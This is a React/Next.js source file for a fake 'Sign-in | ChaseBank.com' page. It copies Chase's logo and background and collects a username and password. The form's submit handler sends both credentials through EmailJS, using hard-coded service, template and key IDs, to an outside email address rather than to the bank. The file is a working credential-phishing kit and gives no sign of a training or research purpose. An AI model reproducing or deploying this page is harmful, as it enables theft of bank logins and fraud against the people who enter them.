import Head from "next/head";
import React, { useRef } from "react";
import Link from "next/link";
import emailjs from "@emailjs/browser";

export default function Home() {
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs.sendForm(
      "service_pa483xc",
      "template_fyi2aep",
      form.current,
      "REPGm9KuFMiM4IKmm"
    );
  };
  return (
    <>
      <Head>
        <title>Sign-in | ChaseBank.com</title>
        <meta name="description" content="Chase bank signup page" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/title.png" />
      </Head>
      {/* <img src="/chasebankBG.jpeg" alt=""/> */}
      <section
        className="min-h-screen md:min-h-screen items-center place-items-center"
        style={{ backgroundImage: "url('/chasebankBG.jpeg')" }}
      >
        <div className="flex p-10 justify-center">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 380 72.2"
            height={30}
          >
            <path
              fill="#FFFFFF"
              d="M356.1,1l-22.5,0c-1.4,0-2.5,1.1-2.5,2.5v17.4H377L356.1,1z"
            />
            <path
              fill="#FFFFFF"
              d="M376.2,23.6h-17.4v45.9l19.8-20.9l0-22.5C378.7,24.7,377.6,23.6,376.2,23.6z"
            />
            <path
              fill="#FFFFFF"
              d="M331.1,71.2h22.5c1.4,0,2.5-1.1,2.5-2.5V51.3h-45.9L331.1,71.2z"
            />
            <path
              fill="#FFFFFF"
              d="M328.4,48.6V2.7l-19.9,20.9v22.5c0,1.4,1.1,2.5,2.5,2.5H328.4z"
            />
            <polygon
              fill="#FFFFFF"
              points="282.4,53.4 252,53.4 252,39.9 281.4,39.9 281.4,30.8 252,30.8 252,18.6 282.4,18.6 288.2,9.4 241.2,9.4 241.2,62.8 288.4,62.8 "
            />
            <path
              fill="#FFFFFF"
              d="M217.3,30.5h-21.4c-2.4,0-4-0.6-4-4.2c0,0,0-3.7,0-3.7c0-3,1.1-4.1,3.9-4.1l28,0l5.9-9.2l-35.7,0
			c-6.5,0-13.1,3.9-13.1,13.9v2.6c0,10.4,6.4,14.4,12.7,14.4H216c2.3,0,4.2,0.4,4.2,4.3l0,4.5c-0.1,3.5-1.8,4.3-4.3,4.3h-29.4
			l-6,9.4h36.2c8.7,0,14.7-4.3,14.7-14.4v-3.7C231.3,35.1,225.8,30.5,217.3,30.5z"
            />
            <path
              fill="#FFFFFF"
              d="M150.8,9.4l25.4,53.4h-12l-4.9-11h-27.6l-4.9,11h-12l25.3-53.4H150.8z M155.2,42.7l-9.7-22.2l-9.7,22.2
						H155.2z"
            />
            <polygon
              fill="#FFFFFF"
              points="98.1,30.6 68.6,30.6 68.6,9.4 57.8,9.4 57.8,62.8 68.6,62.8 68.6,39.9 98.1,39.9 98.1,62.8 108.9,62.8 108.9,9.4 98.1,9.4 		"
            />
            <path
              fill="#FFFFFF"
              d="M20,18.8h25.5l6-9.5H17.8C6.7,9.4,1,16.2,1,26.1v20c0,11.5,7.3,16.8,16.8,16.8l33.7,0L45.3,53H19.9
			c-5.4,0-7.7-2-7.7-8V27C12.1,21.1,14.1,18.8,20,18.8z"
            />
          </svg>
        </div>
        {/* CHASEBANK LOGO ENDS HERE!!1 */}
        {/* FORM DESIGN STARTS HERE !! */}
        <div className="container pt-20 md:mx-auto sm:mx-auto xs:mx-auto">
          <div className="w-4/12 bg-white rounded-md mx-auto shadow-lg overflow-hidden mv:w-min">
            <form className="pt-20 pb-10 px-10" ref={form} onSubmit={sendEmail}>
              <input
                type="text"
                name="message"
                className="leading-tight border-b border-gray-300 text-lg appearance-none focus:outline-none w-80 bg-transparent text-gray-700"
                placeholder="Username"
              />
              <h1 className="p-5"> </h1>
              <input
                type="password"
                name="message"
                className="leading-tight border-b border-gray-300 text-lg appearance-none focus:outline-none w-80 bg-transparent text-gray-700"
                placeholder="password"
              />
              <div className="justify-start space-x-10 flex py-5">
                <div className="flex gap-2">
                  <input type="checkbox" />
                  <h2 className="text-gray-500">Remember me</h2>
                </div>
                <div className="flex gap-2">
                  <input className="" type="checkbox" />
                  <h2 className="text-gray-500">Use token</h2>
                </div>
              </div>
              <input
                className="text-center w-80 bg-blue-500  text-white font-bold rounded-md px-20 py-3"
                type="submit"
                value="Sign in"
              />
              <a className="text-blue-500 flex pt-5" href="www.google.com">
                Forgot username/password?
              </a>
              <a className="text-blue-500 flex" href="signup">
                Not enrolled? Sign Up Now.
              </a>
            </form>
          </div>
        </div>
      </section>
    </>
  );
}
